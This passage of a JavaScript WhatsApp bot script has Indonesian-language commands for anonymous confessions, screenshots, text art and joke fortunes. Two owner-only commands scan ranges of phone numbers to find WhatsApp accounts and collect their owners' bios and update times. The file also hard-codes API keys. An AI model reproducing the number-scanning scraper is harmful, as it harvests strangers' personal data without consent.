KhaerulZx.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await KhaerulZx.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete KhaerulZx.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': case 'stopmenfes': {
 if (banned.includes(m.sender)) {
    return;
    }
 //find = Object.values(KhaerulZx.menfes).find(menpes => menpes.state == 'WAITING')
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
find = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
KhaerulZx.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete KhaerulZx.menfes[find.id]
}
 break

case 'chatfes': {
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
    let find = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender) && menpes.state === 'CHATTING');
    if (!find) return reply("Kamu tidak berada dalam sesi menfess yang sedang aktif.");
    const to = find.a === m.sender ? find.b : find.a;
    if (!text) return reply("Silakan masukkan pesan yang ingin dikirim.");
    await KhaerulZx.sendMessage(to, {
        text: `*Pesan dari Menfess*\n\n${text}`,
        mentions: [m.sender]
    });
    m.reply("Pesan berhasil dikirim ke partner menfess.");
}
break;
/*
case "ssweb": {
if (banned.includes(m.sender)) {
    return;
    }
    let link = text; // Simpan link yang dikirim ke dalam variabel 'link'
    if (!link) return reply(`Contoh ${prefix + command} link`);
    if (!/^https?:\/\//.test(link)) return reply('Awali *URL* dengan http:// atau https://');
    if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                

    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Desktop","id":"${prefix}sswebdesktop ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Tablet","id":"${prefix}sswebtablet ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Phone","id":"${prefix}sswebphone ${link}"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: idsal,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break*/
case "ssweb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return reply(`Contoh ${prefix + command} link`);
    if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://');
    reply(mess.wait);

    try {
        let response = await fetch(`https://api.zenkey.my.id/api/other/ssweb?url=${encodeURIComponent(text)}&apikey=zenkey`);
        if (!response.ok) return reply('Gagal mengambil screenshot. Silakan coba lagi.');
        let buffer = await response.buffer();
        KhaerulZx.sendMessage(from, { image: buffer, caption: mess.success }, { quoted: m });
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengambil screenshot. Silakan coba lagi.');
    }
}
break;
case "sswebdesktop":{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebDesktop(text)
KhaerulZx.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebtablet":{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebTablet(text)
KhaerulZx.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebphone":{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebPhone(text)
KhaerulZx.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break
 case 'news-game': {
 if (banned.includes(m.sender)) {
    return;
    }
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    const url = 'https://www.gamespot.com/news/';
// wm avs
    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        let news = [];
// wm avs
        $('.media-title').each((i, elem) => {
            news.push($(elem).text().trim());
        });
// wm avs
        if (news.length === 0) {
            return m.reply('Tidak ada Game Terbaru.');
        }
// wm avs
        let result = `News Game In 2024\n`;
        news.slice(0, 5).forEach((headline, index) => {
            result += `${index + 1}. ${headline}\n`;
        });
// wm avs
        KhaerulZx.sendMessage(m.chat, { text: result }, { quoted: m });
    } catch (error) {
        m.reply('ad error.');
    }
}
break
case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Gunakan dengan cara .neon *text*`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
KhaerulZx.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=junaa`)
try{
await KhaerulZx.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
KhaerulZx.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
reply(`error`) 
}
}
break
       case 'nowa-cek': {
       if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii Aja`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
m.reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await KhaerulZx.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await KhaerulZx.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await KhaerulZx.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await KhaerulZx.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
 case'tozombie':{
 if (banned.includes(m.sender)) {
    return;
    }
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await KhaerulZx.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
case'cekkhodam': case 'khodam': case 'checkkhodam': {
if (banned.includes(m.sender)) {
    return;
    }
 if (!text) return m.reply('Nama nya mana yang mau di cek khodam nya, \nExample .cekkhodam Finsii')
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}
  reply(`
╭━━━━°「 *Khodam ${text}* 」°
> *Nama* : *\`${text}\`*
> *Khodam* : ${pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Pipa paralon', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang', 'Gagang pintu', 'Setrika', 'Naga Biru', 'Elang Merah', 'Naga Api', 'Naga Es', 'Naga Kepala Tiga', 'Tuyul', 'Ular Kadut', 'Teh Sarimurni', 'Es Dawet', 'Jam dinding', 'Opah', 'Jarjit Singh', 'Upin', 'Ipin', 'Ehsan', 'Pak Somat Dudung', 'Pak RT', 'Pak Lurah', 'Sedotan', 'Sungut Lele', 'Ambatron', 'Ambatukam', 'Rusdi', 'Papan Triplek', 'Naga Kepala Dua', 'Siluman Kelelawar', 'Naga Kepala Empat', 'King of All Khodam'])}
> *Mendampingi dari* : ${pickRandom(['1 tahun lalu','2 tahun lalu','3 tahun lalu','4 tahun lalu','dari lahir'])}
> *Alasan Mendampingi* : ${pickRandom(['Tertarik Kepadamu','Dia Menyukaimu','Ingin Melindungimu','Perintah Dari Leluhur','Gabut'])}
> *Kekuatan* : ${pickRandom(['Mampu melindungi pemiliknya dari roh jahat','Bisa memberikan keberuntungan kepada pemiliknya','Teleportasi','Mengabulkan semua keinginan pemiliknya','Tidur','Masih pemula gaada kekuatannya'])}
> *Expired* : ${pickRandom(['Akhir Tahun ini','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035','Sampai Mati','2087','2076','2029','2080'])}
╰═┅═━––––––๑
`)
}
break
case "createqr": {
if (banned.includes(m.sender)) {
    return;
    }
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah\n contoh : ${prefix+command} Haii`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
KhaerulZx.sendMessage(from, { image: data, caption: `Nih Qr Codenya, reply dengan pesan *.readqr* untuk mendeteksi text yang sudah dibuat menjadi Qr` }, { quoted: m })
}
break
case "detectqr":
case "readqr":
if (banned.includes(m.sender)) {
    return;
    }
if (/image\/(jpe?g|png)/.test(mime)) {
try {
mee = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res123 = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res123.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'cekjodoh': case 'jodohcek': {
if (banned.includes(m.sender)) {
    return;
    }
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        lana = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Gebetan kamu",
  "Pacar kamu",
  "Seseorang yang kamu suka sekarang",
  "Guru Kamu",
  "Mimi peri",
  "Seseorang yang kamu anggap jelek dulu"
  
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Jodoh ${lana} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    


    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        reply(text)
        if (res) {
await KhaerulZx.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
        }
    }
};
break
case 'upaudio': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Ngapain? fitur ini khusus owner!')
    if (!m.quoted) {
        return reply(`[❗] Reply audio dengan format ${prefix + command}`);
    }
    
    if (m.quoted && m.quoted.type === 'audioMessage') {
        try {
            reply('Proses...');
            let idsal = '120363247886007681@newsletter'
            let media = await m.quoted.download();
            await KhaerulZx.sendMessage(idsal, { audio: media }, { quoted: qsal });
            reply('Selesai');
        } catch (err) {
            reply('[❗] Audio tidak ditemukan!\nCoba untuk ulangi kirim/reply audio');
        }
    } else {
        reply('[❗] Reply audio yang valid.');
    }
}
break

//Sumber: https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
case 'sendch':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Ngapain? fitur ini khusus owner!')
    if (!m.quoted) return reply(`Reply audio ${prefix}${command}`)
    if(isMedia || q) {
        try {
            reply('Done')
            let media = await m.quoted.download();
            KhaerulZx.sendMessage('120363247886007681@newsletter', { audio: media }, { quoted: m })
        } catch (err) {
            reply(`Audio tidak ditemukan!\nCoba untuk ulangi kirim/reply audio`)
        }
    } else {
        reply(`Reply audio`)
    }
    break;

case 'quote-create': {
if (banned.includes(m.sender)) {
    return;
    }
  try {
    if (!q) return m.reply(`contoh\n\nquote dingin tapi tidak mematikan`);
// wm avs
    const { createCanvas, loadImage } = require('canvas');
    const fs = require('fs');
    const path = require('path');
// wm avs
    const canvasWidth = 800;
    const canvasHeight = 400;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');
// wm avs
    ctx.fillStyle = '#ffffff'; //serah kalian kalau mau ubah warna
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);
// wm avs
    ctx.fillStyle = '#000000';
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
// wm avs
    const words = q.split(' ');
    const lines = [];
    let currentLine = '';
// wm avs    
    words.forEach(word => {
      const testLine = currentLine + word + ' ';
      const testWidth = ctx.measureText(testLine).width;
      if (testWidth > canvasWidth - 40) {
        lines.push(currentLine);
        currentLine = word + ' ';
      } else {
        currentLine = testLine;
      }
    });
    lines.push(currentLine);
// wm avs
    const lineHeight = 40;
    const textY = (canvasHeight - (lines.length * lineHeight)) / 2;
// wm avs
    lines.forEach((line, index) => {
      ctx.fillText(line.trim(), canvasWidth / 2, textY + (index * lineHeight));
    });
// wm avs
    const outputPath = path.join(__dirname, 'quote.png');
    const out = fs.createWriteStream(outputPath);
    const stream = canvas.createPNGStream();
    stream.pipe(out);
// wm avs
    out.on('finish', async () => {
      await KhaerulZx.sendMessage(from, { image: { url: outputPath }, caption: '_done nih_.', fileName: 'quote.png' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
// wm avs
} catch (err) {
    console.error(err);
    m.reply('error bntar.');
  }
}
break
/*case 'pixel-art':
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return m.reply('masukkan prompt nya')
  try {
    m.reply('*Process generating image, mungkin membutuhkan waktu yang lama*')
    let pix = await (await fetch('https://api.shannmoderz.xyz/ai/pixel-art?prompt=' + text)).json()
    let shannz = pix.result[0]
    KhaerulZx.sendMessage(m.chat, { image: { url: shannz }, caption: 'Ini dia kak' }, { quoted: m })
} catch (e) {
    m.reply('*terjadi kesalahan:*' + e)
}
break
/*case 'flux':

 if (!text) return m.reply('masukkan prompt nya')
  try {
    m.reply('*Process generating image, mungkin membutuhkan waktu yang lama*')
    let pix = await (await fetch('https://api.shannmoderz.xyz/ai/flux-schnell?prompt=' + text)).json()
    let shannz = pix.result[0]
    KhaerulZx.sendMessage(m.chat, { image: { url: shannz }, caption: 'Ini dia hasilnya kak' }, { quoted: m })
} catch (e) {
    m.reply('*terjadi kesalahan:*' + e)
}
break */
break
 case 'namaninja': {    
 if (banned.includes(m.sender)) {
    return;
    }
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
reply(teks.replace(/[a-z]/gi, v => {
return {
'a': 'ka',
'b': 'tu',
'c': 'mi',
'd': 'te',
'e': 'ku',
'f': 'lu',
'g': 'ji',
'h': 'ri',
'i': 'ki',
'j': 'zu',
'k': 'me',
'l': 'ta',
'm': 'rin',
'n': 'to',
'o': 'mo',
'p': 'no',
'q': 'ke',
'r': 'shi',
's': 'ari',
't': 'ci',
'u': 'do',
'v': 'ru',
'w': 'mei',
'x': 'na',
'y': 'fu',
'z': 'zi'
}[v.toLowerCase()] || v
}))
}
break
/*case 'hdvideo': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? KhaerulZx.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidio nya mana?`);
  m.reply("wait..");
  const media = await KhaerulZx.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.1:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    KhaerulZx.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });
  
            
}
break */
 case 'caritemangc': 
case 'carikawangc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!m.isGroup) return reply(mess.group)
if (participants.length === 0) {
return reply('Tidak ada anggota di grup.');
}
const member = participants.map(u => u.id).filter(v => v !== KhaerulZx.user.jid);
if (member.length === 0) {
return reply('Tidak ada anggota non-bot di grup.');
}
const phoneNumber = member[Math.floor(Math.random() * member.length)];
const waLink = `https://wa.me/${phoneNumber.split("@")[0]}`;
await sleep(1000);
reply('Sedang mencari...');
await sleep(4000);
reply('Berhasil mendapatkan satu orang');
await sleep(3000);
KhaerulZx.sendMessage(m.chat, { text: `Nih Kak ${phoneNumber.split("@")[0]}\n\n${waLink}` }, m);
}
break

    /*case 'tiktokaudio': case 'ttsong': case 'ttmp3': {
if (!text) return reply( `Example : ${prefix + command} link`)
     if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(`Tunggu sebentar ya kakak:>`)
require('./lib/tiktok').Tiktok(q).then( data => {
KhaerulZx.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break */
            break
            case "darkjoke": case "darkjokes":
            if (banned.includes(m.sender)) {
    return;
    }
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
KhaerulZx.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
            break
            case 'kobo01': {
            if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('*Khusus Premium*')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (ChatBot) return reply('Sudah Aktif')
chatbot.push(from)
reply('Succes menyalakan kobo di group ini 🌷')
} else if (args[0] === "off") {
if (!ChatBot) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
chatbot.splice(off, 1)
reply('Succes mematikan kobo di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'cekkodam':
case 'cekkhodam2':{
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply('Nama nya mana yang mau di cek khodam nya');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang']);
  const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
  const khodam = `khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;

  KhaerulZx.sendMessage(m.chat, {audio: {url: `https://nue-api.vercel.app/api/tts?lang=id&text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});
}
  break
case 'wtssc': {
if (banned.includes(m.sender)) {
    return;
    }
reply(` *WTS*

_SCRIPT FInsii AI V6_
_TYPE CASE_

BASE : HWMODS
FEATURE : Finsii
PENGEMBAN : KYYXD

*FEATURE? CEK SENDIRI*
wa.me/+6288973380122
`)
}
break
        case "sad1":
        case "sad2":
        case "sad3":
        case "sad4":
        case "sad5":
        case "sad6":
        case "sad7":
        case "sad8":
        case "sad9":
        case "sad10":
        case "sad11":
        case "sad12":
        case "sad13":
        case "sad14":
        case "sad15":
        case "sad16":
        case "sad17":
        case "sad18":
        case "sad19":
        case "sad20":
        case "sad21":
        case "sad22":
        case "sad23":
        case "sad24":
        case "sad25":
        case "sad26":
        case "sad27":
        case "sad28":
        case "sad29":
        case "sad30":
        case "sad31":
        case "sad32":
        case "sad33":
        case "sad34":
        case "sad35":
        if (banned.includes(m.sender)) {
    return;
    }
              bayuamore_dev = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
         );
         await KhaerulZx.sendMessage(
          m.chat,
          {
           audio: bayuamore_dev,
           mimetype: "audio/mp4",
           ptt: true,
          },
          { quoted: m }
         );
         break;  
case 'buylimit': {
if (banned.includes(m.sender)) {
    return;
    }
reply(` Price List Sewa

  • Infinty limited ( 30k )
  • 20 Limited ( 3k )
